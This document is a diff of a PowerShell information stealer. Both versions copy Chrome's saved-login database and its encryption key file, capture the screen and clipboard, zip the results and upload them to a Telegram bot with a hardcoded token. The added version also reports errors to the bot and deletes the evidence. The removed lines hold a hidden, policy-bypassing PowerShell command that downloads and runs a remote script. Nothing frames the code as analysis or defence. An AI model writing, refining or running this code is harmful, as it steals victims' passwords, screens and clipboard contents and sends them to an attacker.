@@ -1,50 +1,42 @@
-function Get-SystemSnapshot {
-    $tempDir = Join-Path $env:TEMP "log_$(Get-Random)"
-    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-    function Copy-BrowserState {
-        $chromeState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-        $chromeLogins = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeState) { Copy-Item $chromeState -Destination "$tempDir\state.dat" }
-        if (Test-Path $chromeLogins) {
-            $fs = [System.IO.File]::Open($chromeLogins, 'Open', 'Read', 'ReadWrite')
-            $out = [System.IO.File]::Create("$tempDir\logins.db")
-            $fs.CopyTo($out); $fs.Close(); $out.Close()
-        }
-    }
+$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
+$chatId = "1940923712"
 
-    function Save-ScreenCapture {
-        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-        $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
-        $bmp.Save("$tempDir\capture.png")
-        $graphics.Dispose(); $bmp.Dispose()
-    }
+$workDir = "$env:TEMP\sys_$(Get-Random)"
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-    function Save-ClipboardText {
-        Get-Clipboard | Out-File "$tempDir\clip.txt"
-    }
-
-    Copy-BrowserState
-    Save-ScreenCapture
-    Save-ClipboardText
-
-    $archive = Join-Path $env:TEMP "report_$(Get-Random).zip"
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $archive)
-
-    $botToken = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
-    $chatId = "1940923712"
-    $url = "https://api.telegram.org/bot$botToken/sendDocument"
+try {
+    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     
-    & curl.exe -s -F "chat_id=$chatId" -F "document=@$archive" $url
+    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
+    if (Test-Path $loginData) {
+        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $out = [System.IO.File]::Create("$workDir\passwords.db")
+        $stream.CopyTo($out); $stream.Close(); $out.Close()
+    }
 
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item $archive -Force -ErrorAction SilentlyContinue
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+    $g = [System.Drawing.Graphics]::FromImage($bmp)
+    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
+    $bmp.Save("$workDir\screen.png")
+    $g.Dispose(); $bmp.Dispose()
+
+    Get-Clipboard | Out-File "$workDir\clipboard.txt"
+
+    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)
+
+    & curl.exe -s -F "chat_id=$chatId" -F "document=@$zipFile" "https://api.telegram.org/bot$token/sendDocument"
+
+} catch {
+    $err = $_.Exception.Message
+    & curl.exe -s -d "chat_id=$chatId" -d "text=Fail: $err" "https://api.telegram.org/bot$token/sendMessage"
+} finally {
+    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
 }
-
-Get-SystemSnapshot
-
-Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -Ep Bypass -W H -C `"iex(iwr 'https://raw.githubusercontent.com/kneel67/infocollector/refs/heads/main/service_setup.ps1' -UseB).Content`"" -WindowStyle Hidden
